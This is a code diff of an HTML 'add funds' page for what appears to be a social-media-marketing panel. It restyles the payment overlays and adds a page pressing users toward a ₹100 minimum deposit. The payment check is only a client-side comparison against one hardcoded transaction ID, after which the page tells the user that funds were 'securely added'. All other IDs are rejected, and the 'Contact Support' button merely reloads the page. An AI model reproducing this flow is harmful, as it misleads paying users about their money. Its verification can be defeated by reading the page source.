@@ -13,23 +13,14 @@
   <style>
     /* --- ORIGINAL STYLES --- */
     .integration-fixed {
-      position: fixed;
-      z-index: 10000000;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      padding: 24px;
-      row-gap: 12px;
+      position: fixed; z-index: 10000000;
+      display: flex; flex-direction: column; justify-content: center;
+      padding: 24px; row-gap: 12px;
     }
-    .integration-fixed__top-left { top: 0; left: 0; }
-    .integration-fixed__top-right { top: 0; right: 0; }
-    .integration-fixed__bottom-left { bottom: 0; left: 0; }
     .integration-fixed__bottom-right { bottom: 0; right: 0; }
+    
     .form-group .subtitle {
-        display: block;
-        font-size: 0.85em;
-        color: #6c757d;
-        margin-top: 5px;
+        display: block; font-size: 0.85em; color: #6c757d; margin-top: 5px;
     }
 
     /* Button Glow Effect */
@@ -50,17 +41,37 @@
         100% { box-shadow: 0 0 12px rgba(0, 123, 255, 0.8); }
     }
 
-    /* --- CONGRATULATIONS PAGE STYLES (UPDATED) --- */
+    /* ========================================= */
+    /* SHARED FULL-SCREEN OVERLAY STYLES         */
+    /* ========================================= */
+    .full-screen-overlay {
+        position: fixed; top: 0; left: 0;
+        width: 100%; height: 100%;
+        display: flex; 
+        z-index: 10000; 
+        display: none; 
+        opacity: 0;
+        transition: opacity 0.4s ease-in-out;
+        overflow-y: auto; /* Allow scrolling */
+        padding: 20px 10px;
+        box-sizing: border-box;
+    }
+
+    .overlay-content-wrapper {
+        margin: auto; 
+        width: 100%;
+        display: flex;
+        justify-content: center;
+        padding-top: 20px;
+        padding-bottom: 20px;
+    }
+
+    /* ========================================= */
+    /* 1. CONGRATULATIONS PAGE STYLES            */
+    /* ========================================= */
     #step-three-congrats {
-        position: fixed; 
-        top: 0; left: 0;
-        width: 100%; height: 100vh;
         background-color: rgba(248, 249, 250, 0.95);
         backdrop-filter: blur(5px);
-        display: flex; justify-content: center; align-items: center;
-        z-index: 10000; 
-        display: none; opacity: 0;
-        transition: opacity 0.5s ease-in-out;
     }
 
     .congrats-card {
@@ -70,15 +81,15 @@
         box-shadow: 0 20px 60px rgba(0,0,0,0.15);
         text-align: center;
         max-width: 450px;
-        width: 90%;
+        width: 100%;
         transform: scale(0.8);
         opacity: 0;
+        box-sizing: border-box; 
     }
 
     .animate-pop-in {
         animation: popIn 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55) forwards;
     }
-
     @keyframes popIn {
         0% { transform: scale(0.8); opacity: 0; }
         100% { transform: scale(1); opacity: 1; }
@@ -86,92 +97,54 @@
 
     .checkmark-circle {
         width: 80px; height: 80px; margin: 0 auto 20px;
-        position: relative;
-        display: inline-block;
-        vertical-align: top;
-        border-radius: 50%;
-        background-color: #d4edda;
+        border-radius: 50%; background-color: #d4edda;
+        position: relative; display: inline-block;
     }
     .checkmark-circle svg {
-        width: 50px; height: 50px;
-        margin-top: 15px;
+        width: 50px; height: 50px; margin-top: 15px;
         display: block; margin-left: auto; margin-right: auto;
     }
     .checkmark-path {
-        stroke: #28a745; stroke-width: 5; stroke-linecap: round;
-        fill: none; stroke-dasharray: 1000; stroke-dashoffset: 1000;
+        stroke: #28a745; stroke-width: 5; stroke-linecap: round; fill: none;
+        stroke-dasharray: 1000; stroke-dashoffset: 1000;
         animation: dash 2s ease-in-out forwards;
     }
-    @keyframes dash {
-        to { stroke-dashoffset: 0; }
-    }
+    @keyframes dash { to { stroke-dashoffset: 0; } }
 
-    .congrats-title {
-        color: #28a745; font-size: 28px; font-weight: 800;
-        margin-bottom: 10px; opacity: 0; transform: translateY(20px);
-        animation: fadeInUp 0.5s ease forwards 0.3s;
-    }
-    .congrats-desc {
-        color: #6c757d; font-size: 16px; margin-bottom: 20px;
-        opacity: 0; transform: translateY(20px);
-        animation: fadeInUp 0.5s ease forwards 0.4s;
-    }
+    .congrats-title { color: #28a745; font-size: 28px; font-weight: 800; margin-bottom: 10px; }
+    .congrats-desc { color: #6c757d; font-size: 16px; margin-bottom: 20px; }
+    
     .amount-badge {
         background: #e8f5e9; color: #28a745;
         padding: 8px 15px; border-radius: 50px;
         font-weight: bold; font-size: 18px; display: inline-block;
         margin-bottom: 30px;
-        opacity: 0; transform: translateY(20px);
-        animation: fadeInUp 0.5s ease forwards 0.5s;
     }
 
-    .action-buttons {
-        display: flex; gap: 10px; flex-direction: column;
-        opacity: 0; transform: translateY(20px);
-        animation: fadeInUp 0.5s ease forwards 0.6s;
-    }
-    
+    .action-buttons { display: flex; gap: 10px; flex-direction: column; }
     .btn-dashboard {
         background: linear-gradient(45deg, #007bff, #0056b3);
-        color: #ffffff !important; 
-        border: none; padding: 12px; border-radius: 8px;
-        font-weight: 600; cursor: pointer; transition: transform 0.2s;
-        text-decoration: none; display: block;
+        color: #fff !important; padding: 12px; border-radius: 8px;
+        font-weight: 600; text-decoration: none; display: block;
+        transition: transform 0.2s;
     }
-    .btn-dashboard:hover { 
-        transform: translateY(-2px); 
-        box-shadow: 0 5px 15px rgba(0,123,255,0.3); 
-        color: #ffffff !important; 
-    }
-    
-    @keyframes fadeInUp {
-        to { opacity: 1; transform: translateY(0); }
-    }
+    .btn-dashboard:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,123,255,0.3); }
 
-    #confetti-canvas {
-        position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-        pointer-events: none; z-index: 9999;
-    }
-
-    /* --- INVALID PAYMENT PAGE STYLES --- */
+    /* ========================================= */
+    /* 2. ERROR PAGE STYLES                      */
+    /* ========================================= */
     #step-error-payment {
-        position: fixed; top: 0; left: 0;
-        width: 100%; height: 100vh;
         background-color: #f0f2f5;
         background-image: radial-gradient(#e5e7eb 1px, transparent 1px);
         background-size: 20px 20px;
-        display: flex; justify-content: center; align-items: center;
-        z-index: 10001; 
-        display: none; opacity: 0;
-        transition: opacity 0.3s ease-in-out;
     }
 
     .payment-card-error {
         background: #ffffff;
-        width: 90%; max-width: 420px;
+        width: 100%; max-width: 420px;
         padding: 40px;
         border-radius: 20px;
-        box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
+        box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1);
         text-align: center;
         position: relative;
         overflow: hidden;
@@ -181,13 +154,19 @@
         width: 100%; height: 6px; background: #ef4444;
     }
 
+    @keyframes shake {
+        0% { transform: translateX(0); }
+        25% { transform: translateX(-10px); }
+        50% { transform: translateX(10px); }
+        75% { transform: translateX(-5px); }
+        100% { transform: translateX(0); }
+    }
+    .shake-animation { animation: shake 0.4s ease-in-out; }
+
     .icon-container-error {
-        width: 80px; height: 80px;
-        background-color: #fef2f2;
-        border-radius: 50%;
-        display: flex; justify-content: center; align-items: center;
+        width: 80px; height: 80px; background-color: #fef2f2;
+        border-radius: 50%; display: flex; justify-content: center; align-items: center;
         margin: 0 auto 20px auto;
-        position: relative;
     }
     .icon-cross { width: 40px; height: 40px; position: relative; }
     .icon-cross::before, .icon-cross::after {
@@ -198,36 +177,90 @@
     .icon-cross::after { transform: translateX(-50%) rotate(-45deg); }
 
     .error-title { color: #1f2937; font-size: 24px; font-weight: 700; margin-bottom: 10px; }
-    .error-desc { color: #6b7280; font-size: 15px; line-height: 1.5; margin-bottom: 25px; }
+    .error-desc { color: #6b7280; font-size: 15px; margin-bottom: 25px; }
 
     .error-details {
         background-color: #f8fafc; border: 1px dashed #cbd5e1;
         border-radius: 8px; padding: 12px; margin-bottom: 25px;
         display: flex; justify-content: space-between; align-items: center;
     }
-    .error-code { font-family: 'Courier New', monospace; font-size: 13px; color: #6b7280; font-weight: 600; }
+    .error-code { font-family: monospace; font-size: 13px; color: #6b7280; font-weight: 600; }
     .copy-btn { background: none; border: none; color: #3b82f6; font-size: 12px; cursor: pointer; font-weight: 600; }
 
-    .btn-error { width: 100%; padding: 14px; border-radius: 10px; border: none; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.2s ease; }
+    .btn-error { width: 100%; padding: 14px; border-radius: 10px; border: none; font-size: 16px; font-weight: 600; cursor: pointer; }
     .btn-error-primary { background-color: #1f2937; color: white; margin-bottom: 12px; }
     .btn-error-primary:hover { background-color: black; }
-    .btn-error-secondary { background-color: transparent; color: #6b7280; border: 1px solid #e5e7eb; }
+    .btn-error-secondary { background: transparent; color: #6b7280; border: 1px solid #e5e7eb; }
+
+    /* ========================================= */
+    /* 3. PENDING PAGE (COMPACT STYLE)           */
+    /* ========================================= */
+    #step-pending-payment {
+        background-color: #f3f4f6;
+        background-image: radial-gradient(#e5e7eb 1px, transparent 1px);
+        background-size: 20px 20px;
+    }
     
-    @keyframes shake {
-        0% { transform: translateX(0); }
-        25% { transform: translateX(-10px); }
-        50% { transform: translateX(10px); }
-        75% { transform: translateX(-5px); }
-        100% { transform: translateX(0); }
+    .payment-card-pending {
+        background: #ffffff;
+        width: 100%; 
+        max-width: 380px; /* Compact Width */
+        padding: 25px;    /* Compact Padding */
+        border-radius: 20px;
+        box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.15);
+        text-align: center;
+        position: relative;
+        overflow: hidden;
+        animation: slideUpFade 0.5s cubic-bezier(0.16, 1, 0.3, 1);
+        box-sizing: border-box;
     }
-    .shake-animation { animation: shake 0.4s ease-in-out; }
-    .loader {
-        display: none; width: 18px; height: 18px; border: 2px solid #fff;
-        border-bottom-color: transparent; border-radius: 50%;
-        animation: rotation 1s linear infinite; display: inline-block;
+    .payment-card-pending::before {
+        content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 5px; 
+        background: linear-gradient(90deg, #f59e0b, #d97706);
     }
-    @keyframes rotation { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+    @keyframes slideUpFade {
+        from { transform: translateY(40px); opacity: 0; }
+        to { transform: translateY(0); opacity: 1; }
+    }
+
+    .icon-pending {
+        width: 60px; height: 60px; 
+        background: #fff7ed; border-radius: 50%;
+        margin: 0 auto 15px; 
+        display: flex; align-items: center; justify-content: center;
+    }
+    .icon-pending svg { width: 32px; height: 32px; color: #d97706; animation: bounce-subtle 2s infinite; }
+    
+    .pending-title { font-size: 20px; font-weight: 800; color: #1f2937; margin-bottom: 8px; }
+    .pending-desc { font-size: 13px; color: #6b7280; line-height: 1.5; margin-bottom: 20px; }
+
+    .pending-details-box {
+        background: #f9fafb; border: 1px solid #e5e7eb;
+        border-radius: 12px; padding: 15px; margin-bottom: 20px; text-align: left;
+    }
+    .detail-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
+    .detail-label { font-size: 13px; color: #6b7280; font-weight: 500; }
+    .detail-value { font-size: 14px; font-weight: 700; color: #111827; }
+    .detail-value.warning { color: #ef4444; text-decoration: line-through; opacity: 0.7; }
+    .detail-value.success { color: #16a34a; }
+    .divider-dash { border-top: 1px dashed #d1d5db; margin: 10px 0; }
+
+    .btn-amber { background: #f59e0b; color: white; margin-bottom: 10px; box-shadow: 0 4px 10px rgba(245, 158, 11, 0.3); }
+    .btn-amber:hover { background: #d97706; transform: translateY(-2px); }
+    .btn-full { width: 100%; padding: 12px; border-radius: 10px; font-weight: 600; border: none; cursor: pointer; transition: 0.2s; font-size: 15px; }
+    .btn-outline { background: transparent; color: #6b7280; border: 1px solid #e5e7eb; }
+    
+    @keyframes bounce-subtle {
+        0%, 100% { transform: translateY(0); }
+        50% { transform: translateY(-5px); }
+    }
+    
     .hidden { display: none !important; }
+    .loader { display: none; width: 18px; height: 18px; border: 2px solid #fff; border-bottom-color: transparent; border-radius: 50%; animation: rotation 1s linear infinite; display: inline-block; }
+    @keyframes rotation { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+    #confetti-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 9999; }
 
   </style>
 
@@ -298,19 +331,19 @@
                 <div class="col-lg-12">
                     <div class="component_card">
                         <div class="card">
-                            <form onsubmit="handlePaymentSubmit(event)" class="component_form_group">
+                            <form id="addFundForm" onsubmit="handlePaymentSubmit(event)" class="component_form_group">
                                 <div class="">
                                     <div class="form-group">
                                         <div id="amount-fields">
                                             <div>
                                                 <label for="amount" class="control-label">Amount</label>
-                                                <input type="number" inputmode="decimal" class="form-control" name="AddFoundsForm[amount]" id="amount" value="100" min="100">
+                                                <input type="number" inputmode="decimal" class="form-control" name="AddFoundsForm[amount]" id="amount" placeholder="Enter Amount" min="1">
                                                 <span class="subtitle">First time minimum ₹100, then after you can choose any plan</span>
                                             </div>
                                         </div>
                                     </div>
 
-                                    <!-- Transaction ID Section (UPDATED) -->
+                                    <!-- Transaction ID Section -->
                                     <div class="form-group" style="margin-top: 15px;">
                                         <div id="utr-fields">
                                             <div>
@@ -334,7 +367,7 @@
                                 
                                 <div class="component_button_submit">
                                     <div class="">
-                                        <button type="submit" class="btn btn-block btn-big-primary" id="payButton" disabled>Submit</button>
+                                        <button type="submit" class="btn btn-block btn-big-primary" id="payButton">Submit</button>
                                     </div>
                                 </div>
                             </form>
@@ -346,49 +379,109 @@
       </div>
       <!-- END: ADD FUNDS CONTENT WRAPPER -->
       
-      <!-- 2. START: SUCCESS CONGRATS PAGE (UPDATED) -->
-      <div id="step-three-congrats">
+      <!-- 2. START: SUCCESS CONGRATS PAGE -->
+      <div id="step-three-congrats" class="full-screen-overlay">
           <canvas id="confetti-canvas"></canvas>
-          <div class="congrats-card" id="congratsCard">
-              <div class="checkmark-circle">
-                  <svg viewBox="0 0 52 52">
-                      <path class="checkmark-path" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8" />
-                  </svg>
-              </div>
-              <h1 class="congrats-title">Payment Successful!</h1>
-              <p class="congrats-desc">Your funds have been securely added to your account.</p>
-              
-              <div class="amount-badge">
-                  Added: <span id="deposit-amount">₹0.00</span>
-              </div>
+          <div class="overlay-content-wrapper">
+              <div class="congrats-card" id="congratsCard">
+                  <div class="checkmark-circle">
+                      <svg viewBox="0 0 52 52">
+                          <path class="checkmark-path" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8" />
+                      </svg>
+                  </div>
+                  <h1 class="congrats-title">Payment Successful!</h1>
+                  <p class="congrats-desc">Your funds have been securely added to your account.</p>
+                  
+                  <div class="amount-badge">
+                      Added: <span id="deposit-amount">₹0.00</span>
+                  </div>
 
-              <div class="action-buttons">
-                  <a href="https://prime-smm-panel.vercel.app/" class="btn-dashboard">Go to Dashboard</a>
+                  <div class="action-buttons">
+                      <a href="https://prime-smm-panel.vercel.app/" class="btn-dashboard">Go to Dashboard</a>
+                  </div>
               </div>
           </div>
       </div>
 
-      <!-- 3. START: INVALID PAYMENT PAGE (UPDATED) -->
-      <div id="step-error-payment">
-        <div class="payment-card-error" id="cardElement">
-            <div class="icon-container-error">
-                <div class="icon-cross"></div>
+      <!-- 3. START: INVALID PAYMENT PAGE -->
+      <div id="step-error-payment" class="full-screen-overlay">
+        <div class="overlay-content-wrapper">
+            <div class="payment-card-error" id="cardElementError">
+                <div class="icon-container-error">
+                    <div class="icon-cross"></div>
+                </div>
+        
+                <h1 class="error-title">Payment Failed</h1>
+                <p class="error-desc">We couldn't process your payment. The Transaction ID provided is invalid or does not match our records.</p>
+        
+                <div class="error-details">
+                    <span class="error-code" id="errorCode">ERR_INVALID_TXN</span>
+                    <button class="copy-btn" onclick="copyErrorToClipboard()">COPY CODE</button>
+                </div>
+        
+                <button class="btn-error btn-error-primary" id="retryBtn" onclick="retryPayment()">
+                    <span id="btnText">Try Again</span>
+                    <span id="loader" class="loader"></span>
+                </button>
+                
+                <button class="btn-error btn-error-secondary" onclick="window.location.reload()">Contact Support</button>
             </div>
-    
-            <h1 class="error-title">Payment Failed</h1>
-            <p class="error-desc">We couldn't process your payment. The Transaction ID provided is invalid or does not match our records.</p>
-    
-            <div class="error-details">
-                <span class="error-code" id="errorCode">ERR_INVALID_TXN</span>
-                <button class="copy-btn" onclick="copyErrorToClipboard()">COPY CODE</button>
+        </div>
+      </div>
+
+      <!-- 4. START: PENDING PAGE (COMPACT STYLE) -->
+      <div id="step-pending-payment" class="full-screen-overlay">
+        <div class="overlay-content-wrapper">
+            <div class="payment-card-pending">
+                <!-- Warning Icon -->
+                <div class="icon-pending">
+                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
+                    </svg>
+                </div>
+
+                <!-- Header -->
+                <h1 class="pending-title">Payment Amount Pending</h1>
+                <p class="pending-desc">
+                    Your wallet activation is pending. Please review the minimum deposit requirement below to proceed.
+                </p>
+
+                <!-- Detailed Summary Box (Compact) -->
+                <div class="pending-details-box">
+                    <div class="detail-row">
+                        <span class="detail-label">Status</span>
+                        <span class="detail-value" style="color:#f59e0b;">Action Required</span>
+                    </div>
+                    
+                    <div class="divider-dash"></div>
+
+                    <div class="detail-row">
+                        <span class="detail-label">You Entered</span>
+                        <span class="detail-value warning">₹<span id="display-entered-amount">0</span></span>
+                    </div>
+                    
+                    <div class="detail-row">
+                        <span class="detail-label">Minimum Required</span>
+                        <span class="detail-value success">₹100.00</span>
+                    </div>
+                    
+                    <div class="divider-dash"></div>
+                    
+                    <div class="detail-row">
+                        <span class="detail-label">Account Action</span>
+                        <span class="detail-value">Activate Features</span>
+                    </div>
+                </div>
+
+                <!-- Buttons -->
+                <button class="btn-full btn-amber" onclick="acceptMinimumDeposit()">
+                    Pay ₹100 & Activate
+                </button>
+                
+                <button class="btn-full btn-outline" onclick="closePendingPage()">
+                    Change Amount
+                </button>
             </div>
-    
-            <button class="btn-error btn-error-primary" id="retryBtn" onclick="retryPayment()">
-                <span id="btnText">Try Again</span>
-                <span id="loader" class="loader"></span>
-            </button>
-            
-            <button class="btn-error btn-error-secondary" onclick="window.location.reload()">Contact Support</button>
         </div>
       </div>
 
@@ -448,19 +541,73 @@
         draw();
     };
 
-  // Handle Form Submission
+  // --- PENDING PAGE LOGIC ---
+  function showPendingPage(amount) {
+      const pendingOverlay = document.getElementById('step-pending-payment');
+      const enteredSpan = document.getElementById('display-entered-amount');
+      const formWrapper = document.getElementById('add-funds-wrapper');
+
+      // Update the amount in the summary box
+      enteredSpan.textContent = amount ? parseFloat(amount).toFixed(2) : "0.00";
+
+      // Hide Form, Show Pending Page
+      formWrapper.style.display = 'none';
+      pendingOverlay.style.display = 'flex';
+      
+      // Fade in
+      setTimeout(() => { pendingOverlay.style.opacity = '1'; }, 10);
+  }
+
+  function closePendingPage() {
+      const pendingOverlay = document.getElementById('step-pending-payment');
+      const formWrapper = document.getElementById('add-funds-wrapper');
+
+      pendingOverlay.style.opacity = '0';
+      setTimeout(() => {
+          pendingOverlay.style.display = 'none';
+          formWrapper.style.display = 'block'; 
+      }, 400);
+  }
+
+  function acceptMinimumDeposit() {
+      const pendingOverlay = document.getElementById('step-pending-payment');
+      const formWrapper = document.getElementById('add-funds-wrapper');
+      
+      // 1. Close Pending Page
+      pendingOverlay.style.opacity = '0';
+      setTimeout(() => {
+          pendingOverlay.style.display = 'none';
+          formWrapper.style.display = 'block';
+          
+          // 2. Auto-fill 100
+          document.getElementById('amount').value = 100;
+          
+          // 3. Highlight/Focus Transaction ID
+          const txnField = document.getElementById('txn_id');
+          txnField.focus();
+          txnField.style.borderColor = "#2563eb";
+          txnField.style.boxShadow = "0 0 0 4px rgba(37, 99, 235, 0.1)";
+      }, 400);
+  }
+
+  // --- MAIN FORM SUBMISSION ---
   function handlePaymentSubmit(event) {
       event.preventDefault();
 
       const amountInput = document.getElementById('amount');
-      const txnInput = document.getElementById('txn_id'); // Changed from utr_id to txn_id
+      const txnInput = document.getElementById('txn_id');
       const enteredTxn = txnInput.value.trim();
       const amountValue = parseFloat(amountInput.value.trim());
 
-      // Validation
-      const isAmountValid = !isNaN(amountValue) && amountValue >= 100;
-      if (!isAmountValid || enteredTxn.length === 0) {
-          alert("Please enter a valid amount (>= ₹100) and Transaction ID.");
+      // 1. CHECK PENDING CONDITION (Amount < 100)
+      if (!amountValue || amountValue < 100) {
+          showPendingPage(amountValue);
+          return;
+      }
+
+      // 2. CHECK IF TXN ID IS PRESENT
+      if (enteredTxn.length === 0) {
+          alert("Please enter Transaction ID.");
           return;
       }
 
@@ -474,7 +621,7 @@
           document.getElementById('add-funds-wrapper').style.display = 'none';
 
           // --- TRANSACTION ID CHECK LOGIC ---
-          const TARGET_TXN = "T2512060817226975369510"; // Updated Target
+          const TARGET_TXN = "T2512060817226975369510"; // Hardcoded ID
 
           if (enteredTxn === TARGET_TXN) {
               // --- SHOW SUCCESS PAGE ---
@@ -498,7 +645,7 @@
               errorContainer.style.display = 'flex';
               setTimeout(() => { errorContainer.style.opacity = '1'; }, 10);
               
-              const card = document.getElementById("cardElement");
+              const card = document.getElementById("cardElementError");
               card.classList.add("shake-animation");
               setTimeout(() => { card.classList.remove("shake-animation"); }, 400);
           }
@@ -541,7 +688,7 @@
              
              // Reset Form Button
              const payBtn = document.getElementById('payButton');
-             payBtn.disabled = true;
+             payBtn.disabled = false;
              payBtn.innerText = "Submit";
              
           }, 300);
@@ -549,23 +696,6 @@
       }, 1500);
   }
 
-  // Input Validation Listeners
-  document.addEventListener('DOMContentLoaded', function() {
-    const amountInput = document.getElementById('amount');
-    const txnInput = document.getElementById('txn_id');
-    const payButton = document.getElementById('payButton');
-    
-    function checkValidation() {
-      const amountValue = parseFloat(amountInput.value.trim());
-      const isAmountValid = !isNaN(amountValue) && amountValue >= 100;
-      const isTxnEntered = txnInput.value.trim().length > 0;
-      payButton.disabled = !(isAmountValid && isTxnEntered);
-    }
-    
-    amountInput.addEventListener('input', checkValidation);
-    txnInput.addEventListener('input', checkValidation);
-    checkValidation();
-  });
 </script>
 </body>
 </html>
